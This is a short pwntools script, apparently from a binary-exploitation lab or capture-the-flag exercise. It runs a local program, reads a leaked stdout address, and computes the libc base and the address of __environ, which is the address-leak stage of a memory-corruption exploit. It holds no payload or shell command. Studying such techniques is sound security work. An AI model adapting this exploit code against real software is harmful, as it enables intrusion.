# Name: environ.py
from pwn import *

p = process("./environ")
elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p.recvuntil(": ")

stdout = int(p.recvuntil("\n"),16)
libc_base = stdout - elf.symbols['_IO_2_1_stdout_']
libc_environ = libc_base + elf.symbols['__environ']

print(hex(libc_base))
print(hex(libc_environ))

p.interactive()

